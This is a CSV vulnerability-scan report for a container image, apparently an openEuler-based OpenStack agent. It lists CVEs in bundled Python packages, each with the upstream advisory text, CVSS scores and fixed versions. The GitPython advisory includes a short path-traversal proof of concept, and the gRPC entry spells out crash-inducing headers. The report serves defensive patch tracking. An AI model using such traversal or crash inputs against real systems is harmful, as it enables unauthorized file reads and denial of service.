https://harbor.archeros.cn/dev/arstack/openstack-3.0/openeuler-binary-araccel-agent:aarch64_3.0.0.65 | Image Id: eff0bfe5cccb759da7a35733edb72dbe7118412e43abd6bf1c03c9f6cfd051b1 | CVE数据库版本: 3.582 | DB创建时间: Oct 11  2024 09:24:36 | OS: openeuler:22.03
cves,description,feed_rating,fixed_version,in_base_image,last_modified_timestamp,link,name,package_name,package_version,published_timestamp,score,score_v3,severity,vectors,vectors_v3,tags
"CVE-2022-24761","HTTP Request Smuggling in waitress
### Impact

When using Waitress behind a proxy that does not properly validate the incoming HTTP request matches the RFC7230 standard, Waitress and the frontend proxy may disagree on where one request starts and where it ends.

This would allow requests to be smuggled via the front-end proxy to waitress and later behavior.

There are two classes of vulnerability that may lead to request smuggling that are addressed by this advisory:

- The use of Python's `int()` to parse strings into integers, leading to `+10` to be parsed as `10`, or `0x01` to be parsed as `1`, where as the standard specifies that the string should contain only digits or hex digits.
- Waitress does not support chunk extensions, however it was discarding them without validating that they did not contain illegal characters

### Patches

This has been fixed in Waitress 2.1.1

### Workarounds

When deploying a proxy in front of waitress, turning on any and all functionality to make sure that the request matches the RFC7230 standard. Certain proxy servers may not have this functionality though and users are encouraged to upgrade to the latest version of waitress instead.

### References

- https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [the Github issue tracker](https://github.com/Pylons/waitress/issues) (if not security related/sensitive)
* Email us at [pylons-project-security@googlegroups.com](mailto:pylons-project-security@googlegroups.com) (If security related or sensitive)

","High","2.1.1","false","Fri Jan 27 2023 13:00:58 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-4f7p-27jc-3c36","CVE-2022-24761","usr/lib/python3.9/site-packages/waitress-2.0.0-py3.9","2.0.0","Sat Mar 19 2022 03:00:59 GMT+0800 (中国标准时间)","5","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",""
"CVE-2023-0286","Vulnerable OpenSSL included in cryptography wheels
pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8.1-39.0.0  are vulnerable to a security issue. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20221213.txt and https://www.openssl.org/news/secadv/20230207.txt.

If you are building cryptography source ('sdist') then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.


","High","39.0.1","false","Tue Feb 06 2024 04:44:21 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-x4qr-2fvf-3mr5","CVE-2023-0286","usr/lib64/python3.9/site-packages/cryptography-36.0.1-py3.9","36.0.1","Thu Feb 09 2023 06:17:06 GMT+0800 (中国标准时间)","7","7.4","High","","CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:H",""
"CVE-2023-50782","Python Cryptography package vulnerable to Bleichenbacher timing oracle attack
A flaw was found in the python-cryptography package. This issue may allow a remote attacker to decrypt captured messages in TLS servers that use RSA key exchanges, which may lead to exposure of confidential or sensitive data.
","High","42.0.0","false","Thu Aug 08 2024 13:10:55 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-3ww4-gg4f-jr7f","CVE-2023-50782","usr/lib64/python3.9/site-packages/cryptography-36.0.1-py3.9","36.0.1","Tue Feb 06 2024 05:30:31 GMT+0800 (中国标准时间)","7","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",""
"CVE-2023-1428","gRPC Reachable Assertion issue
There exists an vulnerability causing an abort() to be called in gRPC. 
The following headers cause gRPC's C++ implementation to abort() when called via http2:

te: x (x != trailers)

:scheme: x (x != http, https)

grpclb_client_stats: x (x == anything)

On top of sending one of those headers, a later header must be sent that gets the total header size past 8KB. We recommend upgrading past git commit 2485fa94bd8a723e5c977d55a3ce10b301b437f8 or v1.53 and above.
","High","1.53.0","false","Fri Nov 10 2023 13:00:50 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-6628-q6j9-w8vg","CVE-2023-1428","usr/lib64/python3.9/site-packages/grpcio-1.41.1-py3.9","1.41.1","Fri Jul 07 2023 05:15:08 GMT+0800 (中国标准时间)","7","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2023-33953","Excessive Iteration in gRPC
gRPC contains a vulnerability that allows hpack table accounting errors could lead to unwanted disconnects between clients and servers in exceptional cases/ Three vectors were found that allow the following DOS attacks:

- Unbounded memory buffering in the HPACK parser
- Unbounded CPU consumption in the HPACK parser

The unbounded CPU consumption is down to a copy that occurred per-input-block in the parser, and because that could be unbounded due to the memory copy bug we end up with an O(n^2) parsing loop, with n selected by the client.

The unbounded memory buffering bugs:

- The header size limit check was behind the string reading code, so we needed to first buffer up to a 4 gigabyte string before rejecting it as longer than 8 or 16kb.
- HPACK varints have an encoding quirk whereby an infinite number of 0’s can be added at the start of an integer. gRPC’s hpack parser needed to read all of them before concluding a parse.
- gRPC’s metadata overflow check was performed per frame, so that the following sequence of frames could cause infinite buffering: HEADERS: containing a: 1 CONTINUATION: containing a: 2 CONTINUATION: containing a: 3 etc…
","High","1.53.2;1.54.3;1.55.2;1.56.2","false","Wed Jul 31 2024 05:37:54 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-496j-2rq6-j6cc","CVE-2023-33953","usr/lib64/python3.9/site-packages/grpcio-1.41.1-py3.9","1.41.1","Wed Aug 09 2023 23:30:15 GMT+0800 (中国标准时间)","7","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2023-32731","Connection confusion in gRPC
When gRPC HTTP2 stack raised a header size exceeded error, it skipped parsing the rest of the HPACK frame. This caused any HPACK table mutations to also be skipped, resulting in a desynchronization of HPACK tables between sender and receiver. If leveraged, say, between a proxy and a backend, this could lead to requests from the proxy being interpreted as containing headers from different proxy clients - leading to an information leak that can be used for privilege escalation or data exfiltration. We recommend upgrading beyond the commit contained in  https://github.com/grpc/grpc/pull/32309
","High","1.53.0","false","Fri Nov 10 2023 13:00:35 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-cfgp-2977-2fmm","CVE-2023-32731","usr/lib64/python3.9/site-packages/grpcio-1.41.1-py3.9","1.41.1","Thu Jul 06 2023 03:12:51 GMT+0800 (中国标准时间)","7","7.4","High","","CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:H",""
"CVE-2022-31116","Incorrect handling of invalid surrogate pair characters
### Impact
_What kind of vulnerability is it? Who is impacted?_

Anyone parsing JSON from an untrusted source is vulnerable.

JSON strings that contain escaped surrogate characters not part of a proper surrogate pair were decoded incorrectly. Besides corrupting strings, this allowed for potential key confusion and value overwriting in dictionaries.

Examples:

```python
# An unpaired high surrogate character is ignored.
>>> ujson.loads(r''\uD800'')
''
>>> ujson.loads(r''\uD800hello'')
'hello'

# An unpaired low surrogate character is preserved.
>>> ujson.loads(r''\uDC00'')
'\udc00'

# A pair of surrogates with additional non surrogate characters pair up in spite of being invalid.
>>> ujson.loads(r''\uD800foo bar\uDC00'')
'foo bar𐀀'
```

### Patches
_Has the problem been patched? What versions should users upgrade to?_

Users should upgrade to UltraJSON 5.4.0.

From version 5.4.0, UltraJSON decodes lone surrogates in the same way as the standard library's `json` module does, preserving them in the parsed output:

```python3
>>> ujson.loads(r''\uD800'')
'\ud800'
>>> ujson.loads(r''\uD800hello'')
'\ud800hello'
>>> ujson.loads(r''\uDC00'')
'\udc00'
>>> ujson.loads(r''\uD800foo bar\uDC00'')
'\ud800foo bar\udc00'
```

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

Short of switching to an entirely different JSON library, there are no safe alternatives to upgrading.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [UltraJSON](http://github.com/ultrajson/ultrajson/issues)

","High","5.4.0","false","Fri Jan 27 2023 13:05:12 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-wpqr-jcpx-745r","CVE-2022-31116","usr/lib64/python3.9/site-packages/ujson-4.0.2-py3.9","4.0.2","Wed Jul 06 2022 05:06:00 GMT+0800 (中国标准时间)","5","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2023-41040","GitPython blind local file inclusion
### Summary

In order to resolve some git references, GitPython reads files from the `.git` directory, in some places the name of the file being read is provided by the user, GitPython doesn't check if this file is located outside the `.git` directory. This allows an attacker to make GitPython read any file from the system.

### Details

This vulnerability is present in

https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/refs/symbolic.py#L174-L175

That code joins the base directory with a user given string without checking if the final path is located outside the base directory.

I was able to exploit it from three places, but there may be more code paths that lead to it:

https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/repo/base.py#L605

https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/repo/base.py#L620

https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/index/base.py#L1353

### PoC

Running GitPython within any repo should work, here is an example with the GitPython repo.

```python
import git

r = git.Repo('.')

# This will make GitPython read the README.md file from the root of the repo
r.commit('../README.md')
r.tree('../README.md')
r.index.diff('../README.md')

# Reading /etc/random
# WARNING: this will probably halt your system, run with caution
# r.commit('../../../../../../../../../dev/random')
```

### Impact

I wasn't able to show the contents of the files (that's why 'blind' local file inclusion), depending on how GitPython is being used, this can be used by an attacker for something _inoffensive_ as checking if a file exits, or cause a DoS by making GitPython read a big/infinite file (like `/dev/random` on Linux systems).

### Possible solutions

A solution would be to check that the final path isn't located outside the `repodir` path (maybe even after resolving symlinks). Maybe there could be other checks in place to make sure that the reference names are valid.

---

> [!NOTE]
> This vulnerability was reported via email, and it was decided to publish it here and make it public, so the community is aware of it, and a fix can be provided.
","Medium","3.1.37","false","Sat Sep 21 2024 04:05:12 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-cwvm-v4w8-q58c","CVE-2023-41040","usr/lib/python3.9/site-packages/GitPython-3.1.32-py3.9","3.1.32","Thu Aug 31 2023 04:09:36 GMT+0800 (中国标准时间)","4","4","Medium","","CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",""
"CVE-2024-34064","Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter
The `xmlattr` filter in affected versions of Jinja accepts keys containing non-attribute characters. XML/HTML attributes cannot contain spaces, `/`, `>`, or `=`, as each would then be interpreted as starting a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. The fix for the previous GHSA-h5c8-rqwp-cp95 CVE-2024-22195 only addressed spaces but not other characters.

Accepting keys as user input is now explicitly considered an unintended use case of the `xmlattr` filter, and code that does so without otherwise validating the input should be flagged as insecure, regardless of Jinja version. Accepting _values_ as user input continues to be safe.
","Medium","3.1.4","false","Tue Jun 11 2024 02:30:58 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-h75v-3vvj-5mfj","CVE-2024-34064","usr/lib/python3.9/site-packages/Jinja2-3.0.3-py3.9","3.0.3","Mon May 06 2024 22:20:59 GMT+0800 (中国标准时间)","4","5.4","Medium","","CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",""
"CVE-2022-40896","Pygments vulnerable to ReDoS
A ReDoS issue was discovered in `pygments/lexers/smithy.py` in Pygments until 2.15.0 via SmithyLexer.
","Medium","2.15.0","false","Thu Mar 28 2024 21:28:18 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-mrwq-x4v8-fh7p","CVE-2022-40896","usr/lib/python3.9/site-packages/Pygments-2.10.0-py3.9","2.10.0","Wed Jul 19 2023 23:30:26 GMT+0800 (中国标准时间)","4","5.5","Medium","","CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",""
